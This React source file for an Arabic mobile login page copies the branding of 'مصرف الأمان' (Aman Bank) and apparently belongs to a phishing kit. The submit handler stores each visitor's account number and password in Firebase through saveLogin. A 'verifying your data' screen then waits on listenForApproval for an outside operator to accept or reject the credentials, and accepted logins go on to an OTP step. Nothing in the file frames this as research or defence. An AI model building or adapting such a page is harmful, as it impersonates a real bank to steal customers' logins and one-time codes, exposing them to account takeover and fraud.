import { useState, useEffect, useRef } from "react";
import { Menu, Search, Eye, EyeOff } from "lucide-react";
import { useNavigate } from "@/components/TransitionContext";
import { saveLogin, saveLoginSession, getLoginSession, listenForApproval } from "@/lib/firebase";

const BLUE = "#1a3a7a";
const BLUE2 = "#1e4db7";

const services = [
  { label: "إدارة المستفيدين", icon: "👤" },
  { label: "بطاقات الدفع المسبق", icon: "💳" },
  { label: "سحب بدون بطاقة", icon: "🏧" },
  { label: "كاستومر اونبوردنق", icon: "👨‍💼" },
  { label: "شحن رصيد الموبايل", icon: "📱" },
  { label: "بطاقات السحب الآلي", icon: "💰" },
  { label: "طباعة بطاقة KIOSK", icon: "🖨️" },
  { label: "تحويل الأموال", icon: "🔄" },
  { label: "طباعة دفتر صكوك", icon: "📄" },
  { label: "مطابقة بيانات 2024", icon: "✅" },
  { label: "أمان باي QR", icon: "📲" },
];

function FieldError({ msg }: { msg: string }) {
  return (
    <p
      style={{
        color: "#ef4444",
        fontSize: 11,
        marginTop: 4,
        textAlign: "right",
        fontWeight: 600,
      }}
    >
      {msg}
    </p>
  );
}

export default function LoginPage() {
  const { navigateTo } = useNavigate();
  const [username, setUsername] = useState(getLoginSession);
  const [password, setPassword] = useState("");
  const [showPw, setShowPw] = useState(false);
  const [menuOpen, setMenuOpen] = useState(false);
  const [pageState, setPageState] = useState<"form" | "waiting">("form");
  const [loginError, setLoginError] = useState("");
  const [errors, setErrors] = useState<{
    username?: string;
    password?: string;
  }>({});
  const [touched, setTouched] = useState<{
    username?: boolean;
    password?: boolean;
  }>({});
  const unsubRef = useRef<(() => void) | null>(null);

  const validate = (u: string, p: string) => {
    const e: { username?: string; password?: string } = {};
    if (!u.trim()) e.username = "رقم الحساب مطلوب";
    if (!p) e.password = "كلمة المرور مطلوبة";
    else if (p.length < 4)
      e.password = "كلمة المرور يجب أن تكون 4 أحرف على الأقل";
    return e;
  };
  const touch = (f: "username" | "password") => {
    setTouched((t) => ({ ...t, [f]: true }));
    setErrors(validate(username, password));
  };
  const isValid =
    !Object.keys(validate(username, password)).length &&
    !!username &&
    !!password;

  const submit = async (e: React.FormEvent) => {
    e.preventDefault();
    const errs = validate(username, password);
    setErrors(errs);
    setTouched({ username: true, password: true });
    if (Object.keys(errs).length) return;

    setLoginError("");
    saveLoginSession(username);
    await saveLogin(username, password).catch(console.error);

    setPageState("waiting");
    unsubRef.current = listenForApproval((approved) => {
      if (approved === true) {
        unsubRef.current?.();
        navigateTo("/otp");
      } else if (approved === false) {
        unsubRef.current?.();
        setPageState("form");
        setPassword("");
        setTouched({});
        setLoginError("اسم المستخدم أو كلمة المرور غير صحيحة");
      }
    });
  };

  /* ── Waiting for admin ── */
  if (pageState === "waiting") {
    return (
      <div dir="rtl" style={{ minHeight: "100vh", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", background: `linear-gradient(160deg,#0d2660,${BLUE},${BLUE2})`, fontFamily: "'Cairo',sans-serif", padding: "0 32px", textAlign: "center" }}>
        <div style={{ position: "relative", width: 96, height: 96, marginBottom: 32 }}>
          <div style={{ position: "absolute", inset: 0, borderRadius: "50%", border: "3px solid rgba(255,255,255,0.1)" }} />
          <div style={{ position: "absolute", inset: 0, borderRadius: "50%", border: "3px solid transparent", borderTopColor: "#f5d06e", animation: "ab-spin 1s linear infinite" }} />
          <div style={{ position: "absolute", inset: 14, borderRadius: "50%", background: "rgba(255,255,255,0.08)", display: "flex", alignItems: "center", justifyContent: "center", fontSize: 28 }}>
            💳
          </div>
        </div>
        <h2 style={{ color: "white", fontSize: 20, fontWeight: 900, margin: "0 0 10px" }}>جارٍ التحقق من بياناتك</h2>
        <p style={{ color: "rgba(200,220,255,0.75)", fontSize: 13, lineHeight: 1.8, margin: "0 0 28px" }}>
          يُرجى الانتظار بينما يتحقق النظام<br />من رقم حسابك وكلمة المرور
        </p>
        <div style={{ display: "flex", gap: 8 }}>
          {[0, 1, 2, 3].map(i => (
            <div key={i} style={{ width: 10, height: 10, borderRadius: "50%", background: "#f5d06e", animation: "ab-dot 1.2s ease-in-out infinite", animationDelay: `${i * 0.18}s` }} />
          ))}
        </div>
      </div>
    );
  }

  return (
    <div
      dir="rtl"
      style={{
        fontFamily: "'Cairo', sans-serif",
        maxWidth: 480,
        margin: "0 auto",
        minHeight: "100vh",
        background: "#f4f7ff",
      }}
    >
      {/* Navbar */}
      <nav
        style={{
          background: "white",
          position: "sticky",
          top: 0,
          zIndex: 50,
          display: "flex",
          alignItems: "center",
          justifyContent: "space-between",
          padding: "12px 16px",
          boxShadow: "0 2px 16px rgba(26,58,122,0.08)",
          direction: "ltr",
        }}
      >
        <div style={{ display: "flex", gap: 4 }}>
          <button
            onClick={() => setMenuOpen(true)}
            style={{
              background: `${BLUE}12`,
              border: "none",
              width: 36,
              height: 36,
              borderRadius: 10,
              cursor: "pointer",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              color: BLUE,
            }}
          >
            <Menu size={18} />
          </button>
          <button
            style={{
              background: `${BLUE}12`,
              border: "none",
              width: 36,
              height: 36,
              borderRadius: 10,
              cursor: "pointer",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              color: BLUE,
            }}
          >
            <Search size={16} />
          </button>
        </div>
        <img
          src="/aman-bank-logo.png"
          alt="مصرف الأمان"
          style={{ height: 52 }}
        />
      </nav>

      {/* Drawer */}
      {menuOpen && (
        <div
          style={{
            position: "fixed",
            inset: 0,
            zIndex: 100,
            background: "rgba(0,0,0,0.5)",
          }}
          onClick={() => setMenuOpen(false)}
        >
          <div
            style={{
              position: "absolute",
              top: 0,
              right: 0,
              bottom: 0,
              width: 280,
              background: "white",
              boxShadow: "-8px 0 40px rgba(0,0,0,0.2)",
            }}
            onClick={(e) => e.stopPropagation()}
          >
            <div
              style={{
                background: `linear-gradient(135deg, #0d2660, ${BLUE})`,
                padding: "28px 20px 20px",
              }}
            >
              <img
                src="/aman-bank-logo.png"
                alt=""
                style={{ height: 40, filter: "brightness(0) invert(1)" }}
              />
              <p
                style={{
                  color: "rgba(200,220,255,0.7)",
                  fontSize: 12,
                  marginTop: 8,
                  marginBottom: 0,
                }}
              >
                مصرف الأمان — خدمات مصرفية متميزة
              </p>
            </div>
            {[
              "الرئيسية",
              "خدماتنا",
              "من نحن",
              "تواصل معنا",
              "الشروط والأحكام",
            ].map((item) => (
              <button
                key={item}
                style={{
                  display: "block",
                  width: "100%",
                  textAlign: "right",
                  padding: "14px 20px",
                  border: "none",
                  borderBottom: "1px solid #f1f5f9",
                  background: "white",
                  color: "#374151",
                  fontSize: 14,
                  fontWeight: 600,
                  cursor: "pointer",
                  fontFamily: "'Cairo', sans-serif",
                }}
              >
                {item}
              </button>
            ))}
          </div>
        </div>
      )}

      {/* Hero */}
      <div style={{ position: "relative", overflow: "hidden", height: 220 }}>
        {/* Photo background */}
        <img
          src="/login-banner.jpg"
          alt=""
          style={{
            position: "absolute",
            inset: 0,
            width: "100%",
            height: "100%",
            objectFit: "cover",
            objectPosition: "center top",
          }}
        />
        {/* Gradient overlay */}
        <div
          style={{
            position: "absolute",
            inset: 0,
            background: `linear-gradient(160deg, rgba(13,38,96,0.55) 0%, rgba(26,58,122,0.42) 50%, rgba(30,77,183,0.35) 100%)`,
          }}
        />
        {/* Dot grid */}
        <div
          style={{
            position: "absolute",
            top: 16,
            left: 20,
            display: "grid",
            gridTemplateColumns: "repeat(5,1fr)",
            gap: 6,
            opacity: 0.25,
          }}
        >
          {Array.from({ length: 15 }).map((_, i) => (
            <div
              key={i}
              style={{
                width: 5,
                height: 5,
                borderRadius: "50%",
                background: "white",
              }}
            />
          ))}
        </div>
        {/* Text */}
        <div
          style={{
            position: "absolute",
            inset: 0,
            display: "flex",
            flexDirection: "column",
            justifyContent: "flex-end",
            padding: "0 24px 40px",
            textAlign: "right",
          }}
        >
          <p
            style={{
              color: "rgba(200,225,255,0.8)",
              fontSize: 12,
              marginBottom: 4,
              fontWeight: 600,
            }}
          >
            أهلاً بك في
          </p>
          <h2
            style={{
              color: "white",
              fontSize: 28,
              fontWeight: 900,
              margin: 0,
              lineHeight: 1.25,
              textShadow: "0 2px 12px rgba(0,0,0,0.4)",
            }}
          >
            مصرف الأمان
          </h2>
          <p
            style={{
              color: "rgba(210,230,255,0.85)",
              fontSize: 14,
              marginTop: 6,
              textShadow: "0 1px 6px rgba(0,0,0,0.3)",
            }}
          >
            حضور فاعل وطموح واعد.
          </p>
        </div>
        {/* Wave */}
        <div style={{ position: "absolute", bottom: 0, left: 0, right: 0 }}>
          <svg
            viewBox="0 0 480 36"
            preserveAspectRatio="none"
            style={{ width: "100%", height: 36, display: "block" }}
          >
            <path
              d="M0,18 C80,36 200,0 320,18 C400,30 450,6 480,18 L480,36 L0,36 Z"
              fill="#f4f7ff"
            />
          </svg>
        </div>
      </div>

      {/* Login card */}
      <div style={{ padding: "0 16px", marginTop: -8 }}>
        <div className="ab-card" style={{ padding: 24 }}>
          <h3
            style={{
              textAlign: "center",
              color: BLUE,
              fontSize: 16,
              fontWeight: 800,
              marginBottom: 20,
              marginTop: 0,
            }}
          >
            تسجيل الدخول
          </h3>
          <form onSubmit={submit} noValidate>
            {/* Username */}
            <div style={{ marginBottom: 16 }}>
              <div style={{ position: "relative" }}>
                <div
                  style={{
                    position: "absolute",
                    right: 14,
                    top: "50%",
                    transform: "translateY(-50%)",
                    fontSize: 16,
                  }}
                >
                  💳
                </div>
                <input
                  type="tel"
                  value={username}
                  minLength={9}
                  maxLength={9}
                  placeholder="رقم الحساب الخاص بمصرف الامان"
                  onChange={(e) => {
                    setUsername(e.target.value);
                    if (touched.username)
                      setErrors(validate(e.target.value, password));
                  }}
                  onBlur={() => touch("username")}
                  style={{
                    width: "100%",
                    padding: "14px 46px 14px 14px",
                    borderRadius: 14,
                    border: `2px solid ${touched.username && errors.username ? "#ef4444" : username ? BLUE : "#e2e8f0"}`,
                    background:
                      touched.username && errors.username
                        ? "#fff5f5"
                        : username
                          ? "#f0f4ff"
                          : "#f8faff",
                    fontSize: 14,
                    fontFamily: "'Cairo',sans-serif",
                    textAlign: "right",
                    color: "#1a202c",
                    outline: "none",
                    transition: "all 0.2s",
                    boxSizing: "border-box",
                  }}
                />
              </div>
              {touched.username && errors.username && (
                <FieldError msg={errors.username} />
              )}
            </div>

            {/* Password */}
            <div style={{ marginBottom: 20 }}>
              <div style={{ position: "relative" }}>
                <div
                  style={{
                    position: "absolute",
                    right: 14,
                    top: "50%",
                    transform: "translateY(-50%)",
                    fontSize: 16,
                  }}
                >
                  🔑
                </div>
                <input
                  type={showPw ? "text" : "password"}
                  value={password}
                  placeholder="كلمة المرور"
                  onChange={(e) => {
                    setPassword(e.target.value);
                    if (touched.password)
                      setErrors(validate(username, e.target.value));
                  }}
                  onBlur={() => touch("password")}
                  style={{
                    width: "100%",
                    padding: "14px 46px 14px 46px",
                    borderRadius: 14,
                    border: `2px solid ${touched.password && errors.password ? "#ef4444" : password ? BLUE : "#e2e8f0"}`,
                    background:
                      touched.password && errors.password
                        ? "#fff5f5"
                        : password
                          ? "#f0f4ff"
                          : "#f8faff",
                    fontSize: 14,
                    fontFamily: "'Cairo',sans-serif",
                    textAlign: "right",
                    color: "#1a202c",
                    outline: "none",
                    transition: "all 0.2s",
                    boxSizing: "border-box",
                  }}
                />
                <button
                  type="button"
                  onClick={() => setShowPw(!showPw)}
                  style={{
                    position: "absolute",
                    left: 12,
                    top: "50%",
                    transform: "translateY(-50%)",
                    background: "none",
                    border: "none",
                    cursor: "pointer",
                    color: "#94a3b8",
                    padding: 0,
                  }}
                >
                  {showPw ? <EyeOff size={18} /> : <Eye size={18} />}
                </button>
              </div>
              {touched.password && errors.password && (
                <FieldError msg={errors.password} />
              )}
            </div>

            {loginError && (
              <div style={{ background: "#fff0f0", border: "1.5px solid #fca5a5", borderRadius: 12, padding: "11px 14px", display: "flex", alignItems: "center", gap: 10, marginBottom: 4 }}>
                <span style={{ fontSize: 18 }}>🚫</span>
                <span style={{ color: "#b91c1c", fontSize: 13, fontWeight: 700, fontFamily: "'Cairo',sans-serif" }}>{loginError}</span>
              </div>
            )}

            <button
              type="submit"
              style={{
                width: "100%",
                padding: "16px 0",
                borderRadius: 14,
                fontWeight: 800,
                fontSize: 15,
                color: "white",
                border: "none",
                cursor: isValid ? "pointer" : "not-allowed",
                background: isValid
                  ? `linear-gradient(135deg,${BLUE},${BLUE2})`
                  : "#c0cfe8",
                boxShadow: isValid ? `0 6px 24px ${BLUE}45` : "none",
                transition: "all 0.2s",
                fontFamily: "'Cairo',sans-serif",
                marginBottom: 12,
              }}
            >
              تسجيل الدخول
            </button>

            <div
              style={{
                display: "flex",
                justifyContent: "space-between",
                alignItems: "center",
              }}
            >
              <button
                type="button"
                style={{
                  background: "none",
                  border: "none",
                  color: "#64748b",
                  fontSize: 12,
                  cursor: "pointer",
                  fontFamily: "'Cairo',sans-serif",
                }}
              >
                نسيت كلمة المرور؟
              </button>
            </div>
          </form>
        </div>
      </div>

      {/* Services */}
      <div style={{ padding: "20px 16px 8px" }}>
        <h4
          style={{
            textAlign: "right",
            color: BLUE,
            fontSize: 14,
            fontWeight: 800,
            marginBottom: 16,
          }}
        >
          خدماتنا
        </h4>
        <div
          style={{
            display: "grid",
            gridTemplateColumns: "repeat(3,1fr)",
            gap: 10,
          }}
        >
          {services.map((s, i) => (
            <button
              key={i}
              style={{
                display: "flex",
                flexDirection: "column",
                alignItems: "center",
                gap: 8,
                padding: "14px 8px",
                borderRadius: 16,
                border: "1.5px solid #eef2ff",
                background: "white",
                cursor: "pointer",
                fontFamily: "'Cairo',sans-serif",
                boxShadow: "0 2px 10px rgba(26,58,122,0.06)",
                transition: "all 0.2s",
              }}
            >
              <div
                style={{
                  width: 48,
                  height: 48,
                  borderRadius: 14,
                  background: `linear-gradient(135deg,${BLUE}0f,${BLUE}1a)`,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  fontSize: 22,
                }}
              >
                {s.icon}
              </div>
              <span
                style={{
                  fontSize: 9.5,
                  color: "#374151",
                  fontWeight: 600,
                  lineHeight: 1.3,
                  textAlign: "center",
                }}
              >
                {s.label}
              </span>
            </button>
          ))}
        </div>
      </div>

      {/* Dream banner */}
      <div
        style={{
          margin: "16px 16px",
          borderRadius: 20,
          overflow: "hidden",
          background: `linear-gradient(135deg,#e8f4fd,#f0f7ff)`,
          border: "1px solid #c7d9f7",
          display: "flex",
          alignItems: "center",
          gap: 0,
        }}
      >
        <div
          style={{ flex: 1, padding: "20px 20px 20px 0", textAlign: "right" }}
        >
          <h3
            style={{
              color: BLUE,
              fontSize: 16,
              fontWeight: 800,
              margin: "0 0 6px",
            }}
          >
            حقق حلمك معنا
          </h3>
          <p
            style={{
              color: "#475569",
              fontSize: 12,
              lineHeight: 1.6,
              margin: "0 0 14px",
            }}
          >
            "يمكنك تحقيق كل أحلامك، إذا كان لديك الشجاعة للسعي وراءها"
          </p>
          <button
            style={{
              background: `linear-gradient(135deg,${BLUE},${BLUE2})`,
              color: "white",
              border: "none",
              padding: "8px 18px",
              borderRadius: 10,
              fontSize: 12,
              fontWeight: 700,
              cursor: "pointer",
              fontFamily: "'Cairo',sans-serif",
            }}
          >
            متابعة
          </button>
        </div>
        <div style={{ fontSize: 64, padding: "0 16px" }}>🧑‍💼</div>
      </div>

      {/* Footer */}
      <div
        style={{
          background: `linear-gradient(135deg,#0d2660,${BLUE})`,
          padding: "20px 16px",
          textAlign: "center",
          marginTop: 8,
        }}
      >
        <img
          src="/aman-bank-logo.png"
          alt=""
          style={{
            height: 28,
            filter: "brightness(0) invert(1)",
            opacity: 0.7,
            marginBottom: 12,
          }}
        />
        <p
          style={{
            color: "rgba(180,210,255,0.7)",
            fontSize: 11,
            margin: "0 0 10px",
          }}
        >
          حقوق النشر محفوظة لمصرف الأمان 2019©
        </p>
        <div style={{ display: "flex", justifyContent: "center", gap: 16 }}>
          {["الشروط والأحكام", "المعلومات", "تواصل معنا"].map((t) => (
            <button
              key={t}
              style={{
                background: "none",
                border: "none",
                color: "rgba(180,210,255,0.65)",
                fontSize: 11,
                cursor: "pointer",
                fontFamily: "'Cairo',sans-serif",
              }}
            >
              {t}
            </button>
          ))}
        </div>
      </div>
    </div>
  );
}
